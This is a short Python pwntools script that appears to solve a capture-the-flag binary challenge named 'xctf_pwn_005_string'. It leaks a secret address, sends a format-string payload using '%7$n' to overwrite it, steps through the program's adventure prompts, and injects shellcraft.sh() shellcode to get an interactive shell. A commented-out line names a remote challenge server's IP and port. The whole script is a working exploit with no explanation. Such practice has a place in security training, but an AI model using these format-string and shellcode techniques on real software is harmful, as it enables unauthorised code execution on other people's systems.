from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',64223)
r = process('./xctf_pwn_005_string')

r.recvuntil("secret[1]")
secret_addr_int = int(r.recvuntil("\n")[-8:-1], 16)
secret_addr_str = str(secret_addr_int)
log.info("Secret Address is: %x", secret_addr_int)

payload  = b"A"*68
payload += b"%7$n"

r.sendlineafter("What should your character's name be:\n",  b"zzkluck")
r.sendlineafter("So, where you will go?east or up?:\n",     b"east")
r.sendlineafter("go into there(1), or leave(0)?:\n",        b"1")

r.sendlineafter("'Give me an address'\n",                   secret_addr_str)
r.sendlineafter("you wish is:\n",                           payload)
r.sendlineafter("USE YOU SPELL\n",                          asm(shellcraft.sh()))
r.interactive()